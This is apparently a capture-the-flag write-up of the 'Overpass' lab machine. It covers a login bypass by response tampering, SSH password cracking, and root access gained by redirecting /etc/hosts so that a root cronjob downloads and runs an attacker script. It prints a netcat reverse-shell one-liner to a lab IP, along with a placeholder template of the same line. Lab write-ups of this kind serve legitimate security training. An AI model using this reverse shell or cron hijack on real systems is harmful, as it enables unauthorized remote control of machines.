# Overpass

![image](https://user-images.githubusercontent.com/56447720/152143895-b8522100-61fa-42e1-8abb-306b80561bd4.png)

## Port Scan

![image](https://user-images.githubusercontent.com/56447720/152144739-6ae3e614-a68d-4bd7-9eca-884fcdea459f.png)

## Directory Scan

![image](https://user-images.githubusercontent.com/56447720/152144710-e6bb61eb-a1b5-408d-8f2e-5b107eb93395.png)

## Web Exploitation

* After seeing all the directories, `/admin` was most intresting to me
* Looking at the source code I found some intresting `.js` files

![image](https://user-images.githubusercontent.com/56447720/152147048-d4bc52bb-70d6-4af0-92b3-fba0257ca596.png)

* `login.js`

![image](https://user-images.githubusercontent.com/56447720/152147124-ee118f84-0d94-45ae-879c-de24d58c099c.png)

* This piece of code has an vulnerability, it checks the response of the browser and if it doesn't incorrect credentials, it redirect us to the `/admin` page

### get admin privilege

* Intercept login request with burp suite and change the response to get the admin panel
* Right-click on the request and > `Do intercept > Request to this response`
* This is the response we get

![image](https://user-images.githubusercontent.com/56447720/152158989-93c0e69f-9364-4bdb-a243-64e95de1ba45.png)

* Updated response

![image](https://user-images.githubusercontent.com/56447720/152159958-e3988a42-f46f-475d-be48-e5134413fb09.png)

* Admin homepage

![image](https://user-images.githubusercontent.com/56447720/152148206-19006b3b-36a2-45ea-a01b-b5238cf6dd15.png)

## User Shell

* we got username from the admin panel, I've used John to crack the SSH password

![image](https://user-images.githubusercontent.com/56447720/152148911-efbb5b6e-b5af-4542-bb3e-376f175f869f.png)

* We successfully got a shell

![image](https://user-images.githubusercontent.com/56447720/152149341-ed01b623-5068-40aa-b12b-c30461039446.png)

## Root shell

* I've used python server to get `linpeas` into the machine

![image](https://user-images.githubusercontent.com/56447720/152151534-86421dbc-71e7-46f0-9c42-2be09fe27284.png) ![image](https://user-images.githubusercontent.com/56447720/152151754-b3fe921b-929d-4572-83c0-0bc6247d1c09.png)

* We have permission to write in `/etc/hosts`

![image](https://user-images.githubusercontent.com/56447720/152152218-a5b9d408-6b3a-4faa-8f50-a7cc36630dfe.png)

* There's a cronjob running on root service which basicallay uses curl and pipe it into bash
* We are going to change the content of `/etc/hosts` , adding our ip as `overpass.thm`

![image](https://user-images.githubusercontent.com/56447720/152152639-020becb3-8d74-4c13-a70d-5b2bdb1935e5.png)

* First create files in your localhost

![image](https://user-images.githubusercontent.com/56447720/152157538-02d62286-55f3-4714-9dd1-d0a77ce6c4fd.png)

* Add a payload in `buildscript.sh`

```bash
└─$ cat downloads/src/buildscript.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.1.250 4444 >/tmp/f
```

* Add your ip and port `[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc (IP) (PORT) >/tmp/f ]`
* Start a python3 server

```bash
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.120.231 - - [02/Feb/2022 18:17:05] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

```

* Start netcat listener
* Wait around 1 minute to get root shell

![image](https://user-images.githubusercontent.com/56447720/152157330-44f27329-9a6c-4b35-acb7-47c158726fdb.png)

![image](https://user-images.githubusercontent.com/56447720/152157784-02ccbdd4-69f3-4b10-a99e-9ae361faae07.png)
